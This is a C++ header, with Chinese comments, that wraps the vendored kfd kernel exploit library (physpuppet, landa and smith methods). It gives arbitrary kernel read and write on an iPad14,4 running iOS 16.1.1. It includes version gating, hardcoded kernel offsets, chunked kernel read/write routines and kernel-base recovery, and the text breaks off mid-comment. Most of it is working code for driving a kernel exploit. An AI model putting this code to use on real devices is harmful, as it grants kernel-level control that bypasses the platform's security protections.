// KfdBackend.h —— kfd 后端门面（纯 C++；本文件**不 include 任何 vendor 头**）
//
// 位置：src/Kernel/KfdBackend.h
// 作用：把内核读写包成"先说清能不能用"的形态：初始化失败只返回 false + 打印原因，
//       绝不把进程带走、绝不 abort。对外的类/函数名与日志前缀（[kfd]）保持不变，
//       调用方（host/main.mm: kfdb::selftest(method)）不需要改一行。
//
// 本文件只看得见 src/Kernel/kfd_glue.h 里那 11 个 extern "C" 函数；
// 所有 vendor 类型（struct kfd / struct dynamic_info / kern_versions[]）都在
// src/Kernel/kfd_glue.c 里被吃掉，这里一个都不出现。
//
// ============================================================================
// 一、★ 为什么必须把库代码拆进一个 .c 文件 ★
// ============================================================================
// vendor/kfd161（= Picasso-v3 的 libkfd）是 **C** 源码，不是 C++：
//   ① perf.h:47 / 62 / 63 / 64 有 `*event = (volatile struct perfmon_event){};`
//      —— C99 复合字面量。C 里这是"就地构造一个聚合体再赋值"，完全合法；
//      在 C++ 里它变成"用一个临时量给 volatile 聚合体赋值（operator=）"，
//      clang 报 `no viable overloaded '='`。CI 已经用真实错误证明过这一点。
//   ② kget_u64 / malloc_bzero（info.h:17-23、common.h:187-193）用 ({ ... }) 语句表达式，
//      这是 GNU C 扩展，C++ 编译器不接受。
//   ③ dynamic_info.h:111 的 kern_versions[] 用的是 C99 designated initializer
//      （`.kern_version = ...`），C++17 下 clang 只当扩展接受并告警。
//   ④ 还有一处只能靠"整段当 C 编"才自然的写法：perf.h:231 被改成 `const auto*`
//      （原写法 `const struct ptov_table_entry*` 在 C++ 里会因类型不完整报
//      subscript of pointer to incomplete type —— C 里那个 tag 在文件作用域可见，不需要改）。
//      ★ 注意：`auto` 在 C 里不是类型，这条要留到真工具链上确认（见第五节第 5 条）。
//
// 反过来，libkfd.h 里带**函数定义**（kopen / kread / kwrite / kclose，libkfd.h:169-205）
// 与**数据定义**（dynamic_info.h:111 的 kern_versions[]、static_info.h:10 的 t1sz_boot），
// 所以它只能被**一个**翻译单元 include —— 两个 TU 各来一次就是成批 duplicate symbol。
//
// 结论（本仓库的固定分工，别改）：
//   src/Kernel/kfd_glue.c   ← 唯一 include vendor 的 TU，按 C 编译
//   src/Kernel/kfd_glue.h   ← C/C++ 双兼容的 10 个函数声明
//   src/Kernel/KfdBackend.h ← 本文件，纯 C++，只 include kfd_glue.h
//   host/Makefile           ← ARHost_FILES 里同时有 main.mm 与 ../src/Kernel/kfd_glue.c
//
// ============================================================================
// 二、★ 为什么门禁必须在调 kfd 之前做完 ★
// ============================================================================
// kfd161 内部用的是**标准 assert**：
//   info.h:10  #include <assert.h>
//   common.h:113-130  原本那套 "print + sleep(30) + exit(1)" 的 assert 重定义被整段注释掉了
//   common.h:132-136  assert_false(message) → print_failure + assert(false)
// 也就是说 assert 触发 = __assert_fail = abort()（SIGABRT），控制权再也回不来，
// 而且块缓冲的 stdout 可能连最后几行日志都丢掉。
// 已知的必死点（每一条都必须在调用前用**我们自己的**代码挡掉）：
//   libkfd.h:175-179   kopen 的 4 条前置 assert（puaf_pages 区间、三个方法枚举上界）
//   info.h:143         三轮版本匹配都不中 → assert_false("unsupported osversion")
//   perf.h:82-83       open("/dev/aes_0", O_RDWR) 后 assert(fd > 0)
//   perf.h:14/21       perf_kread 里 assert(size != 0 && size <= UINT16_MAX)
//   perf.h:108-109     sem_open 路径下 kfd 自己校验 base 处 magic == 0xfeedfacf
//   krkw.h:205-213     spray 铺不满对象时 assert_false
// 还有最坏的一种编译配置：带 -DNDEBUG 时 assert 变成空操作，assert_false 只剩一行打印
// 然后**继续往下跑**（info.h:143 之后 vid 还是 0）—— 那会拿着别的版本条目的偏移去读写内核。
// 所以本文件不依赖 kfd 的 assert 当门禁，这份 TU 也不要带 NDEBUG。
//
// ============================================================================
// 三、init() 的门禁顺序（任一条不过：打印原因 + return false，不把不可控参数交给 kfd）
// ============================================================================
//   1) 架构：uname().machine 必须是 arm64 / arm64e（细节见第五节第 4 条，iOS 会返回机型标识）
//   2) puaf_pages ∈ [16, 65536]（libkfd.h:173-174）
//   3) method ∈ {0=physpuppet, 1=landa, 2=smith}
//   4) sysctlbyname("kern.version") → 去掉尾部 \r\n → kfdg_version_index() 逐字匹配版本表
//   5) kfdg_open(puaf_pages, method)（内部按**名字**映射枚举，见 kfd_glue.c）
//   6) 后置校验：kfdg_current_proc() != 0（kfd 的 find_proc 真的跑成了）
//
// ============================================================================
// 四、这台机器已核实的事实（iPad14,4 / iOS 16.1.1 / build 20B101 / arm64e / M2 = T8112）
// ============================================================================
// 命中的条目是 vendor/kfd161/libkfd/info/dynamic_info.h:14135-14214（表内下标 171）：
//   :14135  .kern_version = "Darwin Kernel Version 22.1.0: Thu Oct  6 19:34:00 PDT 2022;
//                            root:xnu-8792.42.7~1/RELEASE_ARM64_T8112"
//           （★ "Thu Oct  6" 的 Oct 与 6 之间是**两个空格**，抄错就永远不命中）
//   :14156  .proc__p_pid = 0x60             ← selftest 用的就是这个偏移
//   :14158  .proc__object_size = 0x530
//   :14199  .kernelcache__kernel_base = 0xfffffe0007004000
//   :14211  .kernelcache__vn_kqfilter = 0xfffffe00081000c8
//   :14212  .device_id = "iPad14,4"  :14213 .os_version = "16.1.1"  :14214 .build_id = "20B101"
// 同一个 kern_version 串在表里出现 8 次（下标 113/153/156/171/194/218/307/350，分别对应
// iPad14,5 / iPad14,3 / iPad14,4 / iPad14,6 的 20B82 与 20B101），这 8 条的 p_pid、
// proc__object_size、kernelcache__kernel_base、kernelcache__vn_kqfilter **完全相同**。
// 所以 kfdg_version_index() 按"第一个逐字相等"返回 113 也无害；真正权威的下标是 kfd 自己
// 写进 kfd->info.env.vid 的那个（它按 kern_version + device_id + build_id 三段匹配，
// info.h:111/131），kernel_base 用的也是它，本文件不参与选择。
//
// ============================================================================
// 五、真机上仍可能失败的硬限制（写在代码里的同一份事实）
// ============================================================================
// 1) /dev/aes_0 必须能 O_RDWR 打开：perf.h:82-83 直接 open 再 assert(fd > 0)，
//    slide / ptov_table / TTBR / shared_page 全挂在 perf 上，而这一版**没有** perf_supported
//    开关，perf 是无条件跑的。运行形态要能打开它（TrollStore 形态最稳，别在沙盒 app 里跑）。
// 2) kern.maxfilesperproc 要够大：kread_sem_open.h:15 直接拿 maxfilesperproc - 100 当 spray
//    上限，太小会 u64 下溢、或铺不满一个 16KB 页 → krkw.h:205-213 assert_false 直接 abort。
//    （这一条不在上面的门禁序列里：kfd 自己会 abort 而不是返回错误，真机上表现为自检直接
//     消失；真遇到就先确认 kern.maxfilesperproc，再回来决定要不要把它提成门禁。）
// 3) 写"整字为 0"这一路没有把握：kopen 之后生效的是 perf_kwrite（perf.h:31-65），它把每个
//    8 字节值当 perfmon event number 交给 PERFMON_CTL_ADD_EVENT（perf.h:56-59，
//    assert_bsd 失败即 abort）。写 0 会被当成 event number 0 送进内核，行为未经真机验证 ——
//    所以 kwrite_buf 默认**拒绝**含 0 字的写；确需写 0 时把 kfdb::allow_zero_word_write
//    置 true 再验，日志会明确写出这一点。
// 4) uname().machine 在 iOS 上**不是**架构字符串：iOS 的 hw.machine 就是机型标识
//    （kfd 自己 info.h:48-52 的 getiPhoneModel() 正是拿它跟 "iPad14,4" 这类 device_id 比的），
//    而 xnu 的 uname() 填 machine 用的就是同一个值。所以在真机上它会打出 "iPad14,4"。
//    门禁 1 因此写成"uname 或编译期宏任一为 arm64/arm64e"，编译期宏那一路与
//    src/Kernel/BuildTable.h:72-80 的 current_arch() 是同一个判据。日志会把两者都打出来。
// 5) perf.h:231 现在是 `const auto*`（上一轮为 C++ 编过做的补丁）。`auto` 在 C17 里不是类型：
//    clang 要么按 C23 扩展接受（高版本 clang 会告警），要么直接报 "type specifier missing"。
//    ★ 这个文件按 C 编之后，那一行的正确写法是 `const struct ptov_table_entry*`
//      （C 里这个 tag 在文件作用域可见，不需要 auto）。本文件不改 vendor，只在真工具链上
//      报错时按上面一行改回去 —— 这属于编译期问题，不是真机问题。
//
// ============================================================================
// 六、用法
// ============================================================================
//   kfdb::Client c;
//   if (!c.init(1)) {                 // 0=physpuppet 1=landa 2=smith；默认 puaf_pages=2048
//       // 具体原因已经在日志里（[kfd] / [kfdg] 前缀），调用方直接停手即可
//   }
//   uint64_t base = c.kernel_base();          // 内部已校验 base 处 0xfeedfacf，不过返回 0
//   uint8_t buf[16] = {0};
//   c.kread_buf(base, buf, sizeof(buf));      // 读：无返回值语义，成功判据由上层校验数据
//   c.kwrite_buf(buf, addr, sizeof(buf));     // ★ 顺序是 (用户态, 内核态, 长度)
//   c.shutdown();
//
// 一次性自检（命中版本 → open → base+magic → current_proc/kernel_proc 的 p_pid → close）：
//   bool ok = kfdb::selftest(1);
//
// ============================================================================
// 七、这个文件里"故意没有"的东西（不是遗漏）
// ============================================================================
//   * 版本表遍历 / 条目字段打印：kern_versions[] 是 vendor 类型，C++ 侧看不见。
//     需要新信息就往 kfd_glue.h 加一个 extern "C" 函数，不要在 C++ 里 reintroduce vendor 头。
//   * Client::entry()（原来返回 const struct dynamic_info*）：同上，已删。
//   * Client::current_task()：glue 只暴露 current_proc / kernel_proc / kernel_slide 三个成员，
//     当前仓库没有任何调用方用它（grep 只有本文件自己声明过），需要时按上面那条加 glue 函数。

#pragma once

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include <sys/sysctl.h>
#include <sys/utsname.h>
// ★ 超出"最小 include 清单"的唯一一条：selftest 要拿本进程 pid 跟内核里的 p_pid 比，
//   getpid() 声明在 <unistd.h>。缺了它，任何没先 include <unistd.h> 的 TU 都会在 C++ 里
//   报 "use of undeclared identifier 'getpid'"（host/main.mm 现在先 include 了 unistd.h，
//   能侥幸编过，但那是依赖 include 顺序，不该留这种隐式前提）。
#include <unistd.h>

#include "kfd_glue.h"

namespace kfdb {

// ---------------------------------------------------------------------------
// 常量：全部有源码出处，不自己编
// ---------------------------------------------------------------------------

// kfdg_open 内那条 puaf_pages 硬边界，libkfd.h:173-174：
//   const u64 puaf_pages_min = 16;  const u64 puaf_pages_max = 65536;
// （注意：上游 kfd 是 2048 上限，这一版是 65536 —— 以本仓库源码为准。）
inline constexpr uint64_t kPuafPagesMin = 16;
inline constexpr uint64_t kPuafPagesMax = 65536;

// 默认页数：2048 页 × 16KB = 32MB 地址空间，是 kfd 示例里最常用的一档，
// 也是"再往上调就多占地址空间、多担失败面"的分界点。改大请一次只改一档并留日志。
inline constexpr uint64_t kDefaultPuafPages = 2048;

// 超过这个页数就不算"常见档位"了，只警告不拦（kfd 自己的上限是 65536）。
inline constexpr uint64_t kPuafPagesWarnAbove = 8192;

// kernel base 处的 Mach-O 64 头校验期望值（与 perf.h:108 逐字一致）：magic = 0xfeedfacf。
inline constexpr uint32_t kMachOMagic64 = 0xfeedfacfu;

// struct proc 里 p_pid 的偏移，**只用于 selftest 的独立校验**（业务代码不要拿它当偏移表）。
// 来源：vendor/kfd161/libkfd/info/dynamic_info.h:14156（下标 171，iPad14,4 / 16.1.1 / 20B101），
//       `.proc__p_pid = 0x60`；同一 kern_version 串的另外 7 条（113/153/156/194/218/307/350）
//       该字段同样是 0x60，所以这个数在本机上不是"可能对"，是 8 条一致的硬数据。
inline constexpr uint64_t kProcPidOffset = 0x60;

// 单次 kread 的分片上限：kopen 之后生效的是 perf_kread（perf.h:195-198），
// 它 assert(size <= UINT16_MAX)（perf.h:14）并把 size 塞进 u16（perf.h:21）。
// 65528 = 65535 向下取到 8 的倍数，既不超过 u16，也保证分片边界仍然 8 字节对齐。
inline constexpr uint64_t kKreadChunkMax = 65528;

// 单次调用的总长度上限：纯防御，避免调用方手滑传一个巨大 size 把进程卡在循环里。
inline constexpr uint64_t kMaxTransferBytes = 64ull * 1024ull * 1024ull;

// 本机（iPad14,4 / 16.1.1 / 20B101）对应的那条 kern_version 原文，
// **逐字抄自 vendor/kfd161/libkfd/info/dynamic_info.h:14135**（Oct 与 6 之间两个空格）。
// 只用于日志对照与自检提示；真正的匹配是 kfdg_version_index() 扫 vendor 表。
inline constexpr const char* kExpectedKernVersion =
    "Darwin Kernel Version 22.1.0: Thu Oct  6 19:34:00 PDT 2022; "
    "root:xnu-8792.42.7~1/RELEASE_ARM64_T8112";
inline constexpr const char* kExpectedDeviceId = "iPad14,4";
inline constexpr const char* kExpectedBuildId  = "20B101";

// 是否允许写"整字为 0"的 8 字节字。默认 false，理由见顶部第五节第 3 条。
// 需要时由调用方在 init 之前改这个 inline 变量（C++17 inline variable）。
inline bool allow_zero_word_write = false;

// ---------------------------------------------------------------------------
// 小工具
// ---------------------------------------------------------------------------

// 打印时把 nullptr 换成一句人话，避免 %s 收 NULL（UB / 崩溃）。
inline const char* nz(const char* s) {
    return s ? s : "(空)";
}

// 读一个字符串 sysctl（kern.version / hw.machine / kern.osversion 都是这一路）。
inline bool sysctl_str(const char* name, char* out, size_t cap) {
    if (!name || !out || cap < 2) return false;
    out[0] = 0;
    size_t len = cap - 1;
    if (sysctlbyname(name, out, &len, nullptr, 0) != 0) {
        out[0] = 0;
        return false;
    }
    out[cap - 1] = 0;
    return true;
}

// 去掉尾部 \r / \n。sysctl 回来的 kern.version 在部分系统上带一个换行，
// 而表里的字面量没有；不清掉的话 strcmp 永远不等。
inline void trim_eol(char* s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n > 0) {
        const char c = s[n - 1];
        if (c != '\n' && c != '\r') break;
        s[n - 1] = 0;
        n--;
    }
}

// ---------------------------------------------------------------------------
// Client
// ---------------------------------------------------------------------------

struct Client {
    uint64_t handle;   // kfdg_open() 返回的不透明句柄；0 = 不可用
    int      method;   // 0=physpuppet 1=landa 2=smith；-1 = 未初始化
    bool     ok;       // 只有 open 成功且后置校验通过才是 true

    Client() : handle(0), method(-1), ok(false) {}

    // method: 0=physpuppet 1=landa 2=smith。失败返回 false 并打印原因，绝不 abort。
    // 门禁顺序见顶部第三节；任一条不过都不会走到 kfdg_open。
    bool init(int method, uint64_t puaf_pages = kDefaultPuafPages);

    // 内核读：size 必须是 8 的倍数（kfd 内部按 u64 步进，见 krkw.h:8-16）。
    // 超过 65528 字节会自动分片（perf_kread 的 u16 限制，见 perf.h:14/21）。
    // ★ kread 本身没有返回值：返回 true 只代表"参数合法且调用已发出"，
    //   数据对不对必须由调用方校验（selftest 里就做了 magic / p_pid 两道）。
    bool kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const;

    // 内核写：★ 参数顺序是 (uaddr, kaddr, size) —— 与 libkfd.h:38 的 kwrite 一致。
    // size 必须是 8 的倍数。备份 / 回读校验由上层负责（KernelBackend.h 的 write_verified）。
    bool kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const;

    // 取内核基址：base = 条目.kernelcache__kernel_base + perf.kernel_slide（perf.h:100），
    // 并读 base 处 4 字节校验 0xfeedfacf。校验不过返回 0。
    uint64_t kernel_base() const;

    // 旧接口（保留，等价于 kernel_base() != 0）
    bool read_kernel_base(uint64_t* out_base) const;

    void shutdown();

    // kfd 已经解析好的三个值，纯读，零风险（由 kfd_glue.c 直接取成员）。
    uint64_t kernel_proc() const;
    uint64_t current_proc() const;
    uint64_t kernel_slide() const;
};

// ---------------------------------------------------------------------------
// Client::init
// ---------------------------------------------------------------------------

inline bool Client::init(int method_in, uint64_t puaf_pages) {
    // kfd 内部的失败分支会 abort；块缓冲会把前面的日志全丢掉，先关掉缓冲。
    setvbuf(stdout, nullptr, _IONBF, 0);

    printf("[kfd] ==== kfd 后端初始化开始（vendor/kfd161，C 门面 kfd_glue.c）====\n");

    if (handle != 0) {
        printf("[kfd] 已有句柄 0x%llx，不重复 kfdg_open（同一进程内二次 PUAF 会互相踩）\n",
               (unsigned long long)handle);
        return ok;
    }
    ok = false;
    method = -1;

    // ---- 0. 环境信息：只读，零风险，出问题时这几行是唯一线索 ----
    printf("[kfd] pid              = %d\n", (int)getpid());

    // ---- 1. 架构门禁 ----
    // kfd 的页表语义（static_info.h:11-13 的 ptr_mask / pac_mask / unsign_kaddr）与
    // t1sz_boot（static_info.h:10，info.h:117 按内核串里的 T81xx 选 17 或 25）都建立在 arm64 上，
    // 非 arm64 上继续往下走没有任何意义。
    struct utsname u;
    memset(&u, 0, sizeof(u));
    const int urc = uname(&u);
    if (urc != 0) {
        printf("[kfd] 架构门禁不过：uname() 返回 %d，拿不到 machine → 返回 false\n", urc);
        return false;
    }
    printf("[kfd] uname().machine  = %s\n", u.machine[0] ? u.machine : "(空)");
    printf("[kfd] uname().release  = %s\n", u.release[0] ? u.release : "(空)");
    printf("[kfd] uname().nodename = %s\n", u.nodename[0] ? u.nodename : "(空)");

    const bool uname_is_arm =
        (strcmp(u.machine, "arm64") == 0) || (strcmp(u.machine, "arm64e") == 0);

#if defined(__arm64e__)
    const bool compiled_for_arm64 = true;
    const char* compiled_arch = "arm64e";
#elif defined(__arm64__) || defined(__aarch64__)
    const bool compiled_for_arm64 = true;
    const char* compiled_arch = "arm64";
#else
    const bool compiled_for_arm64 = false;
    const char* compiled_arch = "(非 arm64)";
#endif

    if (!uname_is_arm && !compiled_for_arm64) {
        printf("[kfd] 架构门禁不过：uname().machine=\"%s\"，编译目标=%s\n",
               u.machine, compiled_arch);
        printf("[kfd]   kfd 的页表与 PAC 语义只在 arm64 上成立 → 返回 false，不调用 kfdg_open\n");
        return false;
    }
    if (uname_is_arm) {
        printf("[kfd] 架构门禁通过：uname().machine = %s\n", u.machine);
    } else {
        // iOS 上 hw.machine 是机型标识（kfd 自己 info.h:48-52 的 getiPhoneModel() 就是拿它
        // 跟 device_id 比的），xnu 的 uname() 填 machine 用的也是同一个值 —— 真机上这里
        // 打出来的是 "iPad14,4" 这类东西，不是架构。所以本门禁按"uname 或编译期宏 任一为
        // arm64/arm64e"放行；编译期宏那一路与 src/Kernel/BuildTable.h:72-80 同一判据。
        printf("[kfd] 架构门禁通过：uname().machine=\"%s\" 不是架构字符串（iOS 给的是机型标识），\n",
               u.machine);
        printf("[kfd]   由编译期宏 __arm64__/__arm64e__ 放行，编译目标 = %s\n", compiled_arch);
    }

    // ---- 2. puaf_pages 范围门禁（对齐 libkfd.h:173-174）----
    if (puaf_pages < kPuafPagesMin || puaf_pages > kPuafPagesMax) {
        printf("[kfd] puaf_pages=%llu 超出 kfd 允许区间 [%llu, %llu] → 不调用 kfdg_open\n",
               (unsigned long long)puaf_pages,
               (unsigned long long)kPuafPagesMin,
               (unsigned long long)kPuafPagesMax);
        return false;
    }
    if (puaf_pages > kPuafPagesWarnAbove) {
        printf("[kfd] 注意：puaf_pages=%llu 超过常用档位（默认 %llu），地址空间占用与失败面都会变大\n",
               (unsigned long long)puaf_pages,
               (unsigned long long)kDefaultPuafPages);
    }

    // ---- 3. puaf 方法门禁 ----
    // 只要 0/1/2；真实的枚举映射在 kfd_glue.c 的 kfdg_puaf_enum() 里按**名字**做
    // （libkfd.h:21-25 里 smith=1、landa=2，与我们对外的 0/1/2 顺序不同）。
    const char* puaf_name = nullptr;
    switch (method_in) {
        case 0: puaf_name = "physpuppet"; break;
        case 1: puaf_name = "landa"; break;
        case 2: puaf_name = "smith"; break;
        default: puaf_name = nullptr; break;
    }
    if (!puaf_name) {
        printf("[kfd] method=%d 非法：只接受 0=physpuppet 1=landa 2=smith → 不调用 kfdg_open\n",
               method_in);
        return false;
    }

    // ---- 4. 内核版本门禁（关键：不命中就绝不调 kfdg_open）----
    char kern_version[512] = {0};
    char kern_version_raw[512] = {0};
    if (!sysctl_str("kern.version", kern_version, sizeof(kern_version))) {
        printf("[kfd] 读不到 kern.version → 无法查版本表 → 不调用 kfdg_open\n");
        printf("[kfd]   （kfd 自己查不到版本会走 info.h:143 的 assert_false(\"unsupported osversion\")，\n");
        printf("[kfd]     而 assert_false 展开成 assert(false) = abort，进程当场消失）\n");
        return false;
    }

    // 留一份"剥换行之前"的原文：不命中时要按字节打印出来，尾部空白必须看得见。
    {
        const size_t rl = strlen(kern_version);
        const size_t cp = (rl < sizeof(kern_version_raw) - 1) ? rl : (sizeof(kern_version_raw) - 1);
        memcpy(kern_version_raw, kern_version, cp);
        kern_version_raw[cp] = 0;
    }

    // 机型 / build 一起打出来：kfd 自己的三段匹配用的就是这三个字段（info.h:111/131）。
    char hw_machine[128] = {0};
    char os_version[64] = {0};
    const bool have_hw = sysctl_str("hw.machine", hw_machine, sizeof(hw_machine));
    const bool have_os = sysctl_str("kern.osversion", os_version, sizeof(os_version));
    printf("[kfd] hw.machine       = %s（期望 %s）\n",
           have_hw ? hw_machine : "(读不到)", kExpectedDeviceId);
    printf("[kfd] kern.osversion   = %s（期望 %s）\n",
           have_os ? os_version : "(读不到)", kExpectedBuildId);
    printf("[kfd] kern.version     = %s\n", kern_version);

    trim_eol(kern_version);
    printf("[kfd] kern.version（去尾部换行后）= %s\n", kern_version);
    printf("[kfd] 表里本机那条                = %s\n", nz(kExpectedKernVersion));

    const int vid = kfdg_version_index(kern_version);
    if (vid < 0) {
        printf("[kfd] 当前内核版本不在 vendor/kfd161 的 kern_versions[] 表内 → 不调用 kfdg_open\n");
        printf("[kfd]   原因：info.h:100-143 三轮匹配都不中会执行 assert_false(\"unsupported osversion\")，\n");
        printf("[kfd]         而 common.h:132-136 的 assert_false → assert(false) → abort（进程当场消失）。\n");
        printf("[kfd]   实际 kern.version 的原始字节（看清尾部有没有空白 / 中间空格数）：\n");
        printf("[kfd]     ");
        const size_t rl = strlen(kern_version_raw);
        for (size_t i = 0; i < rl; i++) {
            const unsigned char c = (unsigned char)kern_version_raw[i];
            if (c >= 0x20 && c < 0x7f) {
                printf("%c", (char)c);
            } else {
                printf("\\x%02x", (unsigned)c);
            }
        }
        printf("\n");
        printf("[kfd]   去掉尾部换行后逐字比较（strcmp）的结果 = 不相等\n");
        printf("[kfd]   常见原因三个：① 尾部多一个空格/换行没剥干净；② \"Thu Oct  6\" 这类\n");
        printf("[kfd]   日期字段的空格数抄错；③ 这台设备/这个 build 确实不在这 510 条里。\n");
        printf("[kfd]   要支持这台设备：解析本机 kernelcache 量出偏移/符号，往\n");
        printf("[kfd]   vendor/kfd161/libkfd/info/dynamic_info.h 的 kern_versions[] 里加一条，\n");
        printf("[kfd]   三个字段（kern_version / device_id / build_id）都要能逐字对上。\n");
        return false;
    }
    printf("[kfd] 版本表命中：下标 [%d]（kfdg_version_index 用的是逐字 strcmp；\n", vid);
    printf("[kfd]   权威下标仍以 kfd 自己写进 info.env.vid 的为准，kernel_base 用的是它）\n");
    printf("[kfd] 本机条目（下标 171，dynamic_info.h:14135-14214）已知值：\n");
    printf("[kfd]   proc__p_pid=0x%llx proc__object_size=0x530 "
           "kernelcache__kernel_base=0xfffffe0007004000 kernelcache__vn_kqfilter=0xfffffe00081000c8\n",
           (unsigned long long)kProcPidOffset);

    // ---- 5. 调用 kfdg_open（内部 kopen；这一步之后的失败都会 abort，所以门禁必须已经过完）----
    printf("[kfd] puaf 方法 = %d -> %s；kread/kwrite = sem_open 那一对\n", method_in, puaf_name);
    printf("[kfd] puaf_pages = %llu\n", (unsigned long long)puaf_pages);
    printf("[kfd] 提醒：kopen 内部任何一处 assert 触发都会 abort（kfd161 把 sleep(30)+exit(1)\n");
    printf("[kfd]       那段重定义注释掉了，见 common.h:113-130）。上面的门禁就是为了不走到那里。\n");

    const uint64_t h = kfdg_open(puaf_pages, method_in);
    if (h == 0) {
        printf("[kfd] kfdg_open 返回 0 → 失败（原因见上面 [kfdg] 日志）\n");
        return false;
    }
    handle = h;
    method = method_in;
    ok = true;

    // ---- 6. 后置校验：kfd 自己解析出来的关键 kaddr 必须都在 ----
    const uint64_t cur_proc = kfdg_current_proc(handle);
    const uint64_t ker_proc = kfdg_kernel_proc(handle);
    const uint64_t slide    = kfdg_kernel_slide(handle);
    printf("[kfd] open 成功：handle=0x%llx\n", (unsigned long long)handle);
    printf("[kfd]   current_proc=0x%llx kernel_proc=0x%llx kernel_slide=0x%llx\n",
           (unsigned long long)cur_proc,
           (unsigned long long)ker_proc,
           (unsigned long long)slide);

    if (cur_proc == 0) {
        printf("[kfd] 后置校验失败：current_proc=0（kfd 的 find_proc 没跑成）→ close 并返回 false\n");
        kfdg_close(handle);
        handle = 0;
        method = -1;
        ok = false;
        return false;
    }

    printf("[kfd] ==== 初始化成功 ====\n");
    return true;
}

// ---------------------------------------------------------------------------
// Client::kread_buf
// ---------------------------------------------------------------------------

inline bool Client::kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfd] kread 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfd] kread 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfd] kread 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfd] kread 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfd] kread 失败：size=%llu 不是 8 的倍数。kread 内部按 u64 步进（krkw.h:8-16），\n",
               (unsigned long long)size);
        printf("[kfd]       余数字节会被静默丢掉 → 只读 8 的倍数，要 4 字节就按 8 字节读回来再截断。\n");
        return false;
    }
    if (size > kMaxTransferBytes) {
        printf("[kfd] kread 失败：size=%llu 超过单次上限 %llu（防手滑）\n",
               (unsigned long long)size, (unsigned long long)kMaxTransferBytes);
        return false;
    }

    // 成功路径不打印（一次遍历动辄上千次），第一次成功打一行，证明链路是通的。
    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfd] 首次 kread：kaddr=0x%llx size=%llu（之后同类调用不再逐条打印）\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }

    // 分片：perf_kread 单次最多 65535 字节（perf.h:14/21），超出会被 (u16) 静默截断。
    // 分片大小取 8 的倍数，所以每一片的起点仍然 8 字节对齐。
    uint8_t* out = (uint8_t*)uaddr;
    uint64_t done = 0;
    while (done < size) {
        uint64_t chunk = size - done;
        if (chunk > kKreadChunkMax) chunk = kKreadChunkMax;
        const int rc = kfdg_read(handle, kaddr + done, (void*)(out + done), chunk);
        if (rc != 0) {
            printf("[kfd] kread 失败：kfdg_read 返回 %d（kaddr=0x%llx size=%llu，已完成 %llu 字节）\n",
                   rc,
                   (unsigned long long)(kaddr + done),
                   (unsigned long long)chunk,
                   (unsigned long long)done);
            return false;
        }
        done += chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Client::kwrite_buf
// ---------------------------------------------------------------------------

inline bool Client::kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfd] kwrite 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfd] kwrite 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfd] kwrite 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfd] kwrite 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfd] kwrite 失败：size=%llu 不是 8 的倍数（kwrite 内部按 u64 步进，kwrite_dup.h:65-68）\n",
               (unsigned long long)size);
        return false;
    }
    if (size > kMaxTransferBytes) {
        printf("[kfd] kwrite 失败：size=%llu 超过单次上限 %llu（防手滑）\n",
               (unsigned long long)size, (unsigned long long)kMaxTransferBytes);
        return false;
    }

    // 整字为 0 的写默认拒绝，理由见文件顶部第五节第 3 条：kopen 之后走的是 perf_kwrite，
    // 它把每个 8 字节值当 perfmon event number 送进 ioctl（perf.h:56-59），
    // 0 号 event 是否被内核接受未经真机验证，而 assert_bsd 一失败就是 abort。
    // 用 memcpy 逐字取，避免对未对齐的用户态缓冲做 u64 解引用（那是 UB）。
    if (!allow_zero_word_write) {
        const uint8_t* p = (const uint8_t*)uaddr;
        const uint64_t words = size / 8;
        for (uint64_t i = 0; i < words; i++) {
            uint64_t w = 0;
            memcpy(&w, p + (i * 8), sizeof(w));
            if (w == 0) {
                printf("[kfd] kwrite 失败：第 %llu 个 8 字节字是 0（addr=0x%llx）\n",
                       (unsigned long long)i,
                       (unsigned long long)(kaddr + (i * 8)));
                printf("[kfd]   perf_kwrite 把值当 perfmon event number 用，写 0 未经真机验证；\n");
                printf("[kfd]   确需写 0：先验证 event 0 的行为，再把 kfdb::allow_zero_word_write 置 true。\n");
                return false;
            }
        }
    }

    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfd] 首次 kwrite：kaddr=0x%llx size=%llu。备份/回读校验由上层负责\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }

    const int rc = kfdg_write(handle, uaddr, kaddr, size);
    if (rc != 0) {
        printf("[kfd] kwrite 失败：kfdg_write 返回 %d（kaddr=0x%llx size=%llu）\n",
               rc, (unsigned long long)kaddr, (unsigned long long)size);
        return false;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Client::kernel_base
// ---------------------------------------------------------------------------

inline uint64_t Client::kernel_base() const {
    if (handle == 0 || !ok) {
        printf("[kfd] kernel_base 失败：后端未初始化\n");
        return 0;
    }

    // 1) base = 条目.kernelcache__kernel_base + perf.kernel_slide，算法与 perf.h:99-101 同一行；
    //    条目下标用的是 kfd 自己写进 info.env.vid 的那个（不是我们查表查到的下标）。
    const uint64_t base = kfdg_kernel_base(handle);
    if (base == 0) {
        printf("[kfd] kernel_base 失败：kfdg_kernel_base 返回 0（条目静态基址或 slide 缺失，\n");
        printf("[kfd]   具体原因见上面 [kfdg] 日志）\n");
        return 0;
    }

    // 2) 校验：base 处 4 字节必须是 Mach-O 64 magic 0xfeedfacf。
    //    ★ 为什么取低 32 位：kread 只接受 8 的倍数长度（krkw.h 按 u64 步进，glue 也直接拒绝
    //      非 8 倍数），所以要 4 字节就得按 8 字节读；ARM64 是小端，base 处那 4 个字节
